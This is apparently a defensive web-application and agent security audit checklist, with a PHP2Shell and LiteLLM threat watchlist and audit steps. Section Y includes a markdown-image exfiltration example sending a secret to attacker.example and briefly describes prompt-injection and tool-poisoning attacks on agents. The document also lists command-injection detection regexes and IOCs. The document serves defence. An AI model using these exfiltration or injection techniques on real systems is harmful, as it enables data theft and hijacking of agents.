- [ ] Bundled or forgotten runtimes: admin sidecars (phpMyAdmin, Adminer), CMS images (WordPress, Drupal, Joomla), vendor appliances, legacy apps, build/CI images
- [ ] No image/OS-level scanning (Trivy, Grype, Docker Scout) — these see interpreters and OS packages that language-level audits miss
- [ ] WAF/edge rules treated as the fix — they only block known vectors
- [ ] No patch SLA for actively exploited, internet-facing Critical CVEs (target: hours)

### Advanced Attack Classes (R–Z)

#### R. Server-Side Request Forgery (SSRF)

- [ ] Server-side fetches of user- or tenant-controlled URLs: webhooks, link previews, image/avatar fetchers, import-from-URL, PDF/screenshot renderers, OIDC discovery, tenant-configured integration or LLM base URLs
- [ ] No allowlist of schemes, hosts, and ports; non-HTTP schemes accepted (`file://`, `gopher://`, `dict://`, `ftp://`, `php://`)
- [ ] Private, loopback, link-local, and metadata addresses not blocked **after** DNS resolution (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`, `fe80::/10`, IPv4-mapped IPv6, decimal/octal/hex IP forms)
- [ ] Hostname validated but the connection made after re-resolving (DNS rebinding) — connect to the validated IP
- [ ] Redirects followed without re-validating every hop
- [ ] Cloud metadata reachable from workloads (IMDSv1 allowed, or an IMDSv2 hop limit > 1 where containers shouldn't reach it)
- [ ] Internal responses returned to the caller (full-read SSRF), or errors and timings revealing internal reachability (blind SSRF)
- [ ] App servers with unrestricted outbound network access (no egress allowlist)

#### S. Deserialization, Parsers & Archives

- [ ] Native deserialization of untrusted data: Python `pickle`/`marshal`/`shelve`/`jsonpickle`, `yaml.load` without `SafeLoader`, PHP `unserialize` (object injection, POP chains), Java `ObjectInputStream`, .NET `BinaryFormatter`, Node `node-serialize`
- [ ] PHP `phar://` paths reaching file functions (implicit metadata deserialization on PHP 7.x and older)
- [ ] Model files from untrusted sources loaded with pickle-based loaders (`torch.load` with `weights_only=False` — the default before PyTorch 2.6 — `joblib.load`, `numpy.load(allow_pickle=True)`) or with `trust_remote_code=True`
- [ ] XML parsers with external entities or DTD processing enabled (XXE, billion laughs) — including SVG, DOCX/XLSX, SAML, SOAP, and RSS inputs; prefer `defusedxml` or explicitly disabled entity loading
- [ ] Archive extraction without path checks (zip slip via `../`, absolute paths, symlinks) or size/ratio/entry-count limits (zip bombs); Python `tarfile.extractall` without `filter="data"`
- [ ] Signed or encrypted cookies wrapping serialized objects, with weak or leaked keys
- [ ] Parser differentials (duplicate JSON keys, large numbers, Unicode, comments) between services that make security decisions on the same data

#### T. Path Traversal & File Inclusion

- [ ] User input in file paths (read, write, delete, download, template or language-file selection) without canonicalisation and a base-directory check (`realpath`/`resolve()`, then prefix check)
- [ ] `os.path.join`/`Path` with absolute user input (which discards the base), `..` segments, encoded variants (`%2e%2e%2f`, double encoding), Windows backslashes and drive letters, null bytes
- [ ] Dynamic `include`/`require` of user-influenced paths (LFI/RFI), PHP wrappers (`php://filter`, `data://`, `expect://`)
- [ ] Symlinks followed inside user-writable directories; TOCTOU between path check and use
- [ ] Download helpers fed user paths (`send_file`, `send_from_directory`, `FileResponse`, `res.sendFile`, `response()->download`)
- [ ] Agent and IDE file tools not confined to workspace roots (see Y)

#### U. Business Logic, Race Conditions & Financial Integrity

- [ ] Client-controlled prices, totals, discounts, quantities, or currency; negative or zero amounts; overflow; floating-point money (use integer minor units or decimals)
- [ ] Workflow steps skippable or replayable via direct API calls (order without payment, approval without approver, KYC/onboarding bypass)
- [ ] Race conditions on limited resources: double-spend, coupon or voucher reuse, balance and stock updates without row locks or atomic updates, duplicate accounts without unique constraints
- [ ] No idempotency keys on payment, transfer, and order endpoints; retries create duplicates
- [ ] Payment success taken from the browser redirect instead of a verified server-to-server notification
- [ ] Payment notifications (e.g. PayFast ITN, Stripe webhooks) not verified per the provider's spec: signature/passphrase, server-side validation call, source IP ranges, merchant ID, amount and currency matched to the stored order, idempotent handling
- [ ] Card data touching your servers instead of the provider's hosted page or fields (expands PCI DSS scope; CVV must never be stored)
- [ ] Refunds, payouts, bank-detail changes, and credit-limit changes without step-up authentication and dual control
- [ ] Segregation of duties not enforced (the same user can create and approve a payment, supplier, or journal entry)
- [ ] Financial and audit records editable or deletable; backdating allowed; no immutable history of who changed what
- [ ] Rounding, currency conversion, or tax logic exploitable through many small transactions
- [ ] Limits enforced per request but not per account or tenant over time (free-tier abuse, trial farming, referral fraud)

#### V. Multi-Tenancy & Data Isolation

- [ ] Tenant taken from the authenticated identity — never from body, query, header, or subdomain alone
- [ ] Every query tenant-scoped at a layer that can't be forgotten (base repository scope, row-level security), including raw queries and reports
- [ ] Caches, rate-limit buckets, queues, and storage paths keyed by tenant
- [ ] Background jobs, schedulers, and consumers carry and enforce tenant context
- [ ] Search indexes and vector stores filtered by tenant and permissions at query time (RAG cross-tenant leakage)
- [ ] Tenant admins unable to reach other tenants or platform-admin functions (invitations, role grants, SSO settings, custom domains)
- [ ] Tenant-configurable server-side settings (webhook targets, integration base URLs, SMTP hosts, LLM endpoints) validated against SSRF (see R)
- [ ] Uniqueness errors, messages, or timing reveal other tenants' records
- [ ] Per-tenant keys or physical separation where contracts or regulation require it
- [ ] Offboarding deletes or exports all tenant data, including derived data and backups per policy

#### W. Real-Time, Webhooks & Third-Party Integrations

- [ ] WebSockets: handshake `Origin` not validated (cross-site WebSocket hijacking), auth only at connect, no per-message authorisation, tokens in query strings (logged), no message size or rate limits
- [ ] SSE, long-poll, or pub/sub channels guessable or not authorised per subscriber
- [ ] Inbound webhooks without signature verification (HMAC, constant-time compare), timestamp tolerance, replay protection, and idempotency
- [ ] Outbound webhooks: customer URLs fetched without SSRF controls (see R); secrets shared across subscriptions; payloads over-sharing
- [ ] Integration OAuth tokens and API keys unencrypted at rest, broader than needed, never refreshed, or not revoked on disconnect
- [ ] Integration responses trusted blindly (rendered as HTML, used in queries or commands, fed to agents as instructions)
- [ ] Outbound calls without timeouts, bounded retries with backoff, circuit breakers, or response size limits
- [ ] Email and SMS: OTP/notification endpoints abusable for SMS pumping or spam; links built from `Host`; HTML emails embedding unescaped user content

#### X. Denial of Service & Resource Exhaustion

- [ ] ReDoS: backtracking regexes with nested quantifiers on user input, or user-supplied patterns
- [ ] Decompression and parser bombs (gzip/zip, XML entities, pixel floods, deeply nested JSON/YAML)
- [ ] Unbounded `limit`/page size, `IN (...)` lists, batch sizes, exports, or wildcard searches
- [ ] Expensive work on the request path (reports, imports, image processing, LLM calls) without queues, timeouts, or quotas
- [ ] Missing timeouts on outbound HTTP, database queries, and locks; pools exhaustible by slow clients or slow dependencies
- [ ] Blocking calls inside async event loops (sync I/O, CPU-heavy work, `time.sleep`) stalling every connection
- [ ] **Denial of wallet**: metered resources (LLM tokens, SMS, email, serverless, egress) without per-user/tenant budgets, caps, and alerts
- [ ] Algorithmic complexity on attacker-chosen input (hash flooding, quadratic loops, unbounded recursion)
- [ ] No per-client limits on concurrent connections, streams, or background jobs

#### Y. AI, LLM & Agent Security

- [ ] **Prompt injection (direct and indirect)**: untrusted content (web pages, files, emails, tickets, PR comments, tool results, RAG documents) reaches a model that can call tools; instructions and data not separated
- [ ] **Excessive agency**: tools broader than the task needs (shell, arbitrary file writes, network, SQL, SCM writes, email or payment actions); no human confirmation for destructive or external effects; confirmations the model itself can satisfy or bypass
- [ ] **Improper output handling**: model output passed to shells, SQL, `eval`, file paths, or HTTP requests, or rendered as HTML/markdown without validation and sanitising
- [ ] **Exfiltration channels**: markdown images or links rendered with attacker-chosen URLs (`![](https://attacker.example/?q=<secret>)`), auto-fetched previews, tools that call arbitrary hosts
- [ ] **Secrets within reach of the model**: credentials in system prompts, environment variables readable through command tools, tool outputs echoing tokens; system prompts used as access control
- [ ] **Sandboxing**: code and command execution not isolated (container/VM, non-root, no host mounts or Docker socket, restricted egress, CPU/memory/time limits); file tools not confined to workspace roots; symlink escapes
- [ ] **Memory and knowledge poisoning**: untrusted content stored in long-term memory or knowledge bases that later steers other sessions or users; no provenance or review
- [ ] **Cross-user and cross-tenant leakage**: memories, caches, embeddings, or histories not partitioned (see V)
- [ ] **Tool and MCP supply chain**: third-party MCP servers or plugins with broad tokens, unpinned versions, hidden instructions in tool descriptions (tool poisoning), definitions that change after approval
- [ ] **Unbounded consumption**: no caps on agent iterations, delegation depth, tool calls, tokens, or spend per session/user/tenant; scheduled agents running without budgets
- [ ] **Model and provider trust**: unvetted model files (see S), `trust_remote_code`, tenant-configurable provider URLs (see R), TLS verification disabled to providers
- [ ] **Auditability**: tool calls, approvals, and agent actions not logged with user, session, inputs, and outcome; no way to stop running agents
- [ ] **Data handling**: PII or confidential data sent to external model providers without approval, retention terms, or redaction

#### Z. Security Governance & Assurance

- [ ] No threat model or security requirements for high-risk features (auth, payments, multi-tenancy, agents)
- [ ] Security checks absent from CI: SAST, dependency and secret scanning, IaC scanning, and regression tests for fixed vulnerabilities
- [ ] No authorisation test matrix (every role × endpoint, including negative cases across users and tenants)
- [ ] No vulnerability disclosure channel (`/.well-known/security.txt`) or triage SLA; no patch SLAs by severity
- [ ] No inventory of services, domains, repositories, and third-party data processors
- [ ] No periodic access reviews for production, cloud, CI, and admin accounts; offboarding that misses tokens and keys
- [ ] No incident-response runbook, on-call rota, evidence-preservation steps, or rehearsed secret rotation
- [ ] Recovery objectives (RPO/RTO) undefined or untested
- [ ] Accepted risks and security exceptions undocumented or without expiry

### Stack & Platform Modules

Apply a module when its stack appears in the inventory; otherwise mark it N/A.

#### Module: PHP & Laravel

Runtime and configuration — check `php.ini` / `conf.d/*.ini`, FPM pool configs, `.htaccess` / `.user.ini`, and the Apache/nginx vhost. Unset directives mean the default applies.

- [ ] PHP on a supported branch, at or above its latest security release (https://www.php.net/supported-versions.php)
- [ ] SAPI recorded: Apache mod_php (most exposed to pre-application bugs), FPM, FrankenPHP, LSAPI, php-cgi
- [ ] `session.upload_progress.enabled = 0` unless the feature is used — it defaults to On and runs before application code, even if the app never calls `session_start()`
- [ ] Request parsing bounded in PHP (`post_max_size`, `upload_max_filesize`, `max_file_uploads`, `max_input_vars`, `max_input_nesting_level`, `max_multipart_body_parts`) and at the proxy (`client_max_body_size`, `LimitRequestBody`); multipart blocked at the edge where no uploads are accepted
- [ ] `expose_php`, `display_errors`, `display_startup_errors` Off; `log_errors` On with a working `error_log`
- [ ] `allow_url_include = Off` (`allow_url_fopen = Off` if unused); `disable_functions` covers `exec`, `passthru`, `shell_exec`, `system`, `proc_open`, `popen`, `pcntl_exec` where not needed; `open_basedir` set
- [ ] nginx + FPM: `cgi.fix_pathinfo = 0`, only existing `.php` files passed to FastCGI (`try_files $uri =404`), no PHP execution in upload/storage paths
- [ ] Session cookies: `session.cookie_httponly`, `session.cookie_secure`, `session.cookie_samesite`, `session.use_strict_mode = 1`
- [ ] Per-request INI overrides contain no deprecated, invalid, or `open_basedir`-rejected values (their warnings fire before request init — a PHP2Shell trigger); prefer startup config (`php.ini`, FPM pool)
- [ ] FPM: `pm.max_requests` set so workers recycle; `pm.status_path` / `ping.path` not public; port 9000 never public (direct FastCGI access allows `PHP_VALUE` injection → RCE)
- [ ] No reachable `phpinfo()`; `.htaccess` / `.user.ini` not writable by the web user

PHP code:

- [ ] Loose comparisons in security checks: `==` on hashes or tokens (`"0e123" == "0e456"` is true), `in_array`/`array_search` without strict mode, `strcmp()` on arrays returning `null` — use `hash_equals` and `===`
- [ ] `extract()`, `parse_str()` without a result array, or variable variables (`$$name`) on request data
- [ ] `$_SERVER['PHP_SELF']`/`REQUEST_URI` echoed into pages or form actions (XSS); `$_SERVER['HTTP_HOST']` used to build links
- [ ] Legacy `mysql_*` calls or string-built `mysqli`/PDO queries; `addslashes`-style escaping instead of prepared statements
- [ ] `preg_replace` with `/e`, `create_function`, or `assert()` on strings (legacy code — and a sign of an EOL runtime)
- [ ] `file_get_contents`/`fopen`/`include` on user input (SSRF and LFI via wrappers)
- [ ] `session_regenerate_id(true)` missing on login; `session.use_trans_sid` or session IDs accepted from URLs
- [ ] Tokens generated without `random_bytes`/`random_int` (`rand`, `mt_rand`, `uniqid`, and `str_shuffle` are predictable)

Laravel:

- [ ] `APP_DEBUG=false` and `APP_ENV=production` in production; `APP_KEY` unique per environment and never committed
- [ ] Mass assignment: `$guarded = []`, `forceFill`, `fill`/`create`/`update` with `$request->all()` — use `$request->validated()` and `$fillable`
- [ ] Raw query methods (`DB::raw`, `whereRaw`, `orderByRaw`, `selectRaw`) without bindings
- [ ] Blade `{!! !!}` on user data
- [ ] Policies or Gates enforced on every controller action (`authorize`, `can` middleware); nested route bindings scoped to the parent (`scopeBindings`)
- [ ] CSRF `$except` list minimal; Sanctum stateful domains restricted
- [ ] `config/cors.php` without `*` origins combined with `supports_credentials`
- [ ] `TrustProxies` not trusting `*` unless every request passes a load balancer that overwrites forwarding headers
- [ ] `throttle` middleware on login, reset, OTP, and API routes
- [ ] Telescope, Horizon, Debugbar, Ignition, and log viewers disabled or gated in production
- [ ] Document root is `public/`; `.env`, `storage/`, and `vendor/` never web-reachable
- [ ] Uploads validated (`mimes`/`mimetypes`, `max`), stored outside `public`, and served through authorised routes or `temporarySignedRoute` URLs
- [ ] Signed routes verified with the `signed` middleware and given an expiry
- [ ] Sensitive columns use `encrypted` casts; `Hash` used for passwords only
- [ ] `$request->all()` never logged; queued jobs don't serialize secrets
- [ ] No `Http::withoutVerifying()`

#### Module: Python (FastAPI, Django, Flask)

- [ ] Routers or views missing auth dependencies, decorators, or permission classes (`Depends(...)`, `@login_required`, DRF `permission_classes`) — prefer router- or project-level defaults
- [ ] No `response_model`/serializer, so ORM objects with hashes or internal fields are returned
- [ ] Pydantic models with `extra="allow"`, or request models bound straight onto ORM objects (mass assignment)
- [ ] Dangerous calls: `subprocess` with `shell=True`, `os.system`, `os.popen`, `eval`/`exec`, `pickle`, `yaml.load`, `tarfile.extractall` without `filter`, `tempfile.mktemp`
- [ ] SQLAlchemy `text()`, Django `.raw()`/`.extra()` with f-strings; `order_by` from request input
- [ ] `requests`/`httpx` without timeouts, with `verify=False`, or following redirects to internal hosts
- [ ] `assert` used for security checks (removed under `python -O`)
- [ ] Jinja2 `autoescape` off, `Markup()`/`|safe` on user data, `render_template_string` with user input (SSTI)
- [ ] Django: `DEBUG=True`, `ALLOWED_HOSTS=["*"]`, secure-cookie and `SECURE_*` settings unset, `@csrf_exempt` sprawl, admin without MFA or IP restriction
- [ ] Flask: `debug=True` in deployments (the Werkzeug debugger allows code execution), weak `SECRET_KEY`, sensitive data in client-side session cookies
- [ ] FastAPI/Starlette: `/docs` and `/openapi.json` public for private APIs; no `TrustedHostMiddleware`; CORS with a broad `allow_origin_regex` or `*` plus credentials; uvicorn `--forwarded-allow-ips='*'`
- [ ] Blocking I/O in `async def` handlers (sync DB drivers, `requests`, file I/O) stalling the event loop
- [ ] `FileResponse`, `send_file`, or `send_from_directory` built from user paths
- [ ] Request body and multipart limits (size, part count) enforced by the server or proxy

#### Module: JavaScript / TypeScript (Node, Vue/Nuxt, React/Next, Vite)

- [ ] `child_process.exec`/`execSync` with interpolated strings (use `execFile`/`spawn` with argument arrays); `eval`, `new Function`, or `vm` treated as a sandbox
- [ ] Prototype pollution via deep merge, query parsing, or config loading
- [ ] Express: no `helmet`, `trust proxy` misconfigured, body parsers without size limits, `res.redirect(req.query.x)`, `express.static` serving dotfiles
- [ ] Nuxt: secrets in `runtimeConfig.public`; `server/api` routes without auth; SSR fetches of user-controlled URLs (SSRF); `v-html` on user data
- [ ] Next.js: route handlers and server actions without their own auth checks (middleware-only auth has been bypassable, e.g. CVE-2025-29927); image optimizer `remotePatterns` wildcards; secrets in `NEXT_PUBLIC_*`
- [ ] React: `dangerouslySetInnerHTML`, user-controlled `href` (`javascript:`), SSR state serialized without escaping
- [ ] Vite/webpack dev servers exposed to the network (`--host`, widened `server.fs.allow`); production source maps
- [ ] JWT libraries without pinned `algorithms`; `jwt.decode` (unverified) used for authorisation
- [ ] `RegExp(userInput)`; `JSON.parse` on unbounded bodies
- [ ] CI installs with `npm install` instead of `npm ci` (lockfile not enforced); dependency lifecycle scripts unreviewed

#### Module: Desktop & Local Services (Tauri, Electron, localhost backends)

- [ ] Local HTTP/WebSocket servers bound to `0.0.0.0` instead of `127.0.0.1`
- [ ] Localhost APIs callable from any website: no per-launch auth token, permissive CORS, unchecked WebSocket `Origin`, no `Host` validation against DNS rebinding
- [ ] Tauri: capabilities and permissions broader than needed (`fs`, `shell`, `http` scopes with `**`), CSP disabled or `null`, remote URLs granted IPC access, commands without input validation, broad asset-protocol scope
- [ ] Electron: `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false`, `webSecurity: false`, `allowRunningInsecureContent`, `shell.openExternal` on untrusted URLs, preload scripts exposing powerful APIs
- [ ] Auto-update without signature verification, or over plain HTTP
- [ ] Deep links and custom URL schemes passing unvalidated parameters to privileged actions
- [ ] Secrets in plaintext files instead of the OS keychain; config files readable by other local users
- [ ] Release builds with devtools or debug flags enabled; unsigned or unnotarized binaries
- [ ] The desktop client runs commands or file operations requested by a backend without per-action consent, path scoping, or command allowlists

#### Module: Containers & Kubernetes

- [ ] Privileged containers, added capabilities (`SYS_ADMIN`, `NET_ADMIN`), `hostNetwork`/`hostPID`/`hostIPC`, or host path mounts
- [ ] Docker socket (`/var/run/docker.sock`) mounted into any container — equivalent to root on the host
- [ ] Running as root; `allowPrivilegeEscalation` not false; no read-only root filesystem; no seccomp/AppArmor profile
- [ ] Images from unverified sources, unpinned tags, unscanned, or unsigned (no cosign/notation verification)
- [ ] Build secrets in layers (`ARG`/`ENV`, copied credentials) instead of BuildKit secret mounts; `.dockerignore` not excluding `.git`, `.env`, and keys
- [ ] Services published on all host interfaces (`"5432:5432"` instead of `"127.0.0.1:5432:5432"`)
- [ ] Kubernetes RBAC: `cluster-admin` bindings, wildcard verbs/resources, broad `secrets` access; service-account tokens automounted by default
- [ ] No NetworkPolicies (flat pod network), no Pod Security Admission (`restricted`), no resource requests/limits
- [ ] Secrets in ConfigMaps or committed manifests; etcd encryption at rest off; no external secret store
- [ ] Management endpoints exposed (Kubernetes dashboard, kubelet, Docker API on TCP 2375, or 2376 without client-certificate auth)

#### Module: Cloud (AWS, GCP, Azure)

- [ ] Public storage: buckets or objects public, bucket policies with `"Principal": "*"`, account-level public-access blocks off
- [ ] IAM: wildcard actions/resources, long-lived access keys instead of roles or workload identity, unused or unrotated keys, no MFA on human and root accounts
- [ ] Trust policies without conditions (`sts:ExternalId`, `aws:SourceArn`); CI OIDC trust not restricted to repository and branch (`sub` claim)
- [ ] Firewalls/security groups open to `0.0.0.0/0` on SSH, RDP, database, or admin ports
- [ ] IMDSv2 not enforced; workloads holding powerful instance roles
- [ ] Audit logging off or mutable (CloudTrail, Cloud Audit Logs, Activity Log); no threat detection enabled
- [ ] Encryption at rest off, or KMS key policies granting broad use
- [ ] Public snapshots, images, or databases; managed databases with public endpoints
- [ ] Serverless functions with plaintext secrets in env vars, broad roles, or unauthenticated function URLs
- [ ] IaC state with secrets committed or stored unencrypted (`terraform.tfstate`), no state locking, unmanaged drift
- [ ] No budgets or billing alerts (stolen credentials are used for crypto-mining and LLMjacking)
- [ ] Managed AI services (Bedrock, Vertex AI, Azure OpenAI) invocable by broad roles

#### Module: CI/CD Pipelines (GitHub Actions, Bitbucket Pipelines, GitLab CI)

- [ ] Script injection: untrusted context (`${{ github.event.issue.title }}`, PR titles and bodies, branch names, commit messages) interpolated into shell steps
- [ ] `pull_request_target` or `workflow_run` workflows that check out and run fork code with secrets or write tokens
- [ ] Third-party actions, pipes, and CI images not pinned to a commit SHA or digest
- [ ] Token permissions broader than needed (declare `permissions:`; default to `contents: read`)
- [ ] Secrets exposed to fork PRs, echoed in logs, or written in pipeline YAML
- [ ] Self-hosted runners on public repos or shared across trust levels; non-ephemeral runners
- [ ] Production deploys without protected environments, required reviewers, or branch restrictions
- [ ] Default and release branches without required reviews, status checks, force-push protection, and CODEOWNERS on CI and security-sensitive paths
- [ ] Artifact or cache poisoning across workflows or branches
- [ ] Long-lived cloud credentials stored as CI secrets instead of OIDC federation
- [ ] No secret scanning or push protection on the repository

#### Module: Databases & Data Stores

- [ ] App connects as owner/superuser; no separate least-privilege runtime and migration users; DDL possible at runtime
- [ ] Database reachable from the internet or every network segment; TLS not required
- [ ] Default, shared, anonymous, or passwordless accounts (MySQL/MariaDB anonymous users, `root` without a password, PostgreSQL `trust` entries in `pg_hba.conf`)
- [ ] Sensitive columns unencrypted (national ID numbers, bank details, tokens, API keys); keys stored in the same database
- [ ] No row-level security where tenant isolation depends on the database (see V)
- [ ] Redis/Memcached without auth or ACLs, exposed, or holding sessions/tokens without TTLs; dangerous commands (`FLUSHALL`, `CONFIG`, `DEBUG`) not restricted
- [ ] Search engines (Elasticsearch/OpenSearch) without auth; vector stores without tenant filters
- [ ] Dumps or backups in web roots, repositories, or public buckets; fixtures containing production data
- [ ] Stored procedures building dynamic SQL from parameters
- [ ] Privileged database operations not audit-logged

---

## Active Threat Watchlist

Last updated: 2026-10-22. Fast-path checks for recent high-impact exploits — **not a substitute for the Threat-Intel Pass**. Entries are point-in-time; re-verify versions against the linked sources.

### PHP2Shell — CVE-2026-109618, CVE-2026-109619 (disclosed 2026-10-21, exploited from 2026-10-17)

- **What**: memory-safety flaws in PHP's fatal-error/out-of-memory handling. Partially initialised or stale request state (session upload progress, unserializer, fatal-error backtrace, OPcache) is reused by a later request on the same worker → unauthenticated RCE and disclosure of worker memory (passwords, tokens, keys). Independent of application code. CVSS 9.2; broadly exploited.
- **Affected**: PHP below 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 — every release of the last decade (back to 5.4) has at least one of the bugs. 8.1 and older are EOL: fixes only via distro/LTS backports or PHP's minimal source backports for 7.4/8.0/8.1.
- **Fixed in**: 8.2.35, 8.3.36, 8.4.27, 8.5.12, or a distro/LTS package carrying the backport.
- **Exposure by SAPI**: Apache mod_php worst (RCE before any app code runs, default limits); FrankenPHP likely similar; PHP-FPM susceptible (session-lifecycle RCE validated); LSAPI conditional; php-cgi affected.
- **Detect in repo**:
  - `FROM`/`image:` refs to `php`, or to images that bundle PHP (`wordpress`, `drupal`, `joomla`, `phpmyadmin`, `adminer`); distro installs (`php8.x-*`, `php8x`); `composer.json` `config.platform.php`; `.php-version`; CI `setup-php` versions
  - Floating tags → **Unknown** until `php -v` in the deployed image shows a fixed version
  - Preconditions: `session.upload_progress.enabled` (default On); `fatal_error_backtraces` (8.5); per-request INI overrides with deprecated/invalid values; `RLIMIT_AS`/`RLIMIT_DATA` limits on workers
- **If you cannot patch immediately** (none of these is complete):
  - Set administratively, then restart every worker: `session.upload_progress.enabled=0` (keep it off after patching if unused); on 8.5 also `fatal_error_backtraces=0`
  - Block `multipart/form-data` at the edge where the app takes no uploads; otherwise apply your CDN/WAF vendor's PHP2Shell rules
  - Bound decoded body size, input vars, nesting depth, multipart parts, headers per part, and uploads — at the proxy and in PHP
  - `memory_limit=-1` (set administratively) is PHP's primary config mitigation for CVE-2026-109618 but removes the per-request memory cap — pair it with container/cgroup memory limits; never use `RLIMIT_AS`/`RLIMIT_DATA` (they trigger the vulnerable path)
  - FPM: `pm.max_requests=1` if performance allows (no follow-up request on the same worker)
  - Remove deprecated/invalid per-request INI directives
  - Otherwise take internet-facing instances offline until patched
- **IOCs / hunting** (from 2026-10-17 onward):
  - Multipart POSTs containing `PHP_SESSION_UPLOAD_PROGRESS`, followed by `Allowed memory size … exhausted` errors or bursts of HTTP 500
  - Unusually large or malformed `PHPSESSID` **response** cookies, including on apps that never start sessions (memory disclosure)
  - Unexplained worker churn — FPM child exit/respawn bursts, Apache child segfaults
  - Source IPs seen by AWS (shared anonymisation infrastructure — investigate, don't just block): 103.216.220.92, 31.223.184.166, 37.19.200.5, 134.209.159.64, 103.114.163.188, 95.217.98.37
  - Post-exploitation: new or modified PHP files, web shells, `sh`/`curl`/`wget` spawned by `php-fpm`/`apache2`/`httpd`, unexpected outbound connections (category P)
  - Exploitation runs below the application — missing log entries prove nothing
- **Severity**: Critical for any internet-reachable instance below the fixed version or Unknown (remediate within hours); High when internal-only.
- **Sources**: [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) · [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) · [Wiz research](https://www.wiz.io/blog/php2shell-php-rce) · [AWS threat intel](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/) · [NCSC alert](https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php) · [NCSC-NL list of products bundling PHP](https://github.com/NCSC-NL/php2shell)

### LiteLLM 1.107.0 malicious release — supply-chain compromise (2026-10-21)

- **What**: trojanised `litellm==1.107.0` on PyPI (11:39–13:20 UTC) and in LiteLLM Docker images on GHCR/Docker Hub (`v1.107.0`, `latest`, `main-latest`, `main-stable`; removed ~13:53 UTC). It drops `cook.pth`, `cook.py`, and `sitecustomize.py` into site-packages, so it runs on every Python start. It steals browser, cloud (incl. instance metadata), SSH/GPG, shell-history, and LLM API credentials, and dumps the proxy's `LiteLLM_CredentialsTable`.
- **Last known-good**: 1.106.2.
- **Detect**: resolved `litellm` version in `uv.lock` / `poetry.lock` / `requirements*.txt` / `Pipfile.lock`; LiteLLM images on floating tags (e.g. `ghcr.io/berriai/litellm:main-latest`); `litellm-1.107.0.dist-info`, `cook.pth`, `cook.py`, or `sitecustomize.py` in site-packages; marker file `/tmp/.pc_once_72129118c59f5636c0bb`; env `PRIVCOLLECT_ACTIVE=1`; egress to `litellm[.]dev`.
- **If found**: treat the host, CI runner, or container as compromised. Rotate every credential it could reach (cloud keys and roles, LLM keys, GitHub tokens, SSH keys, DB credentials), rebuild from clean images, pin ≤ 1.106.2 by hash, and review cloud audit logs for `sts:GetCallerIdentity` → `bedrock:ListFoundationModels` from 168.100.8.57 / 165.227.201.8 (LLMjacking).
- **Root-cause lessons** (audit for these generally — J, M): gateway logs captured CLI OAuth tokens; the internal gateway was internet-exposed; stolen tokens could both trigger and approve the release workflow.
- **Severity**: Critical if the version or image was ever installed or pulled; otherwise Info.
- **Source**: [Wiz — LiteLLM compromised](https://www.wiz.io/blog/litellm-compromised-steals-credentials)

### Adding an entry

Add one for any Critical or actively exploited issue in a runtime, framework, or widely used dependency. Use primary sources and absolute dates:

```
### <Name> — <CVE IDs> (disclosed YYYY-MM-DD, exploited from YYYY-MM-DD)
- **What**: mechanism and impact in one or two lines
- **Affected / Fixed in**: per branch
- **Exposure conditions**: deployment modes, config flags, features
- **Detect in repo**: files, patterns, and versions that prove exposure
- **If you cannot patch immediately**: interim mitigations and their limits
- **IOCs / hunting**: log patterns, IPs, files, processes, and the hunting start date
- **Severity**: by exposure (internet-facing / internal)
- **Sources**: primary advisory URLs
```

Retire an entry once every inventoried system is past the fixed versions and its compromise-assessment window has closed.

---

## Severity Definitions

| Severity | Definition |
|---|---|
| **Critical** | Exploitable remotely with no authentication; leads to full compromise, data breach, or RCE |
| **High** | Exploitable with low complexity; leads to significant data exposure or privilege escalation |
| **Medium** | Requires specific conditions; limited impact or partial data exposure |
| **Low** | Minor issue, defence-in-depth concern, or requires unlikely conditions |
| **Info** | Best-practice recommendation, no direct exploitability |

Additional rules:

- A known-exploited vulnerability (CISA KEV or credible in-the-wild reports) in a deployed, reachable component is **Critical**, regardless of application code quality.
- **Unknown** deployed version of a component under an active Critical advisory: rate it at the advisory's severity until verified — it is an evidence gap, not a pass.
- End-of-life runtime or framework on an internet-facing system: **High** (Critical when a known unpatched RCE applies).
- For known CVEs, start from the published CVSS score (v4 where available), then adjust for reachability and exposure — state both.

---

## How to Run the Audit

Tool names differ between agent harnesses. Map each capability below to whatever your harness provides, and degrade gracefully when one is missing:

| Capability | Used for | If unavailable |
|---|---|---|
| File discovery (glob or listing) | Inventories, configs, manifests | Use a shell listing if permitted; otherwise ask for a file tree |
| Content search (regex) | Pattern leads in step 6 | Read files directly, starting with entry points and configs |
| File reading | Tracing source → sink | Required — the audit can't run without it |
| Shell (only if permitted) | Local scanners, `git log`, runtime version checks | Skip scanners and record the gap |
| Web search and fetch | Threat-Intel Pass | Use the watchlist and list components still needing a lookup |
| Sub-agents or parallel tasks | Splitting category groups on large codebases | Work through the groups sequentially, keeping notes |

1. **Treat the repository as untrusted.** Don't run install, build, test, or project scripts (`npm install`, `composer install`, `pip install`, `make`, git hooks, devcontainer or editor tasks) outside a sandbox — they execute repository code. Analyse read-only first.
2. **Map the project structure and tech stack** before reading files in depth.
3. **Run any built-in security scanner** your harness or project provides as a baseline. Treat its output as leads: built-in scanners often rely on static vulnerability tables and miss runtimes and malicious releases, so they never replace the Threat-Intel Pass.
4. **Build the inventories**: resolved dependency versions from lockfiles (`package-lock.json`, `uv.lock`, `poetry.lock`, `composer.lock`, …), manifests for ranges and scripts (`package.json`, `requirements.txt`, `pyproject.toml`, `composer.json`), and the runtime & platform inventory (category Q) across every repo in scope.
5. **Run the Threat-Intel Pass** (workflow step 2) for every inventoried component.
6. **Search for risky patterns** (ripgrep regex syntax — adapt `(?i)` and escaping if your search tool uses another flavour). A hit is a lead, not a finding — trace each one to an attacker-controlled source:
   - Hardcoded credentials: `(?i)(password|passwd|secret|api[_-]?key|token)\s*[:=]\s*['"][^'"]{8,}`
   - Code injection: `\beval\s*\(|new\s+Function\s*\(`
   - Command injection: `shell\s*=\s*True|os\.system\s*\(|child_process|\b(exec|system|passthru|shell_exec|popen|proc_open)\s*\(`
   - CORS and token handling: `(?i)(cors|access-control-allow-origin)`, `(?i)(jwt|jsonwebtoken)`
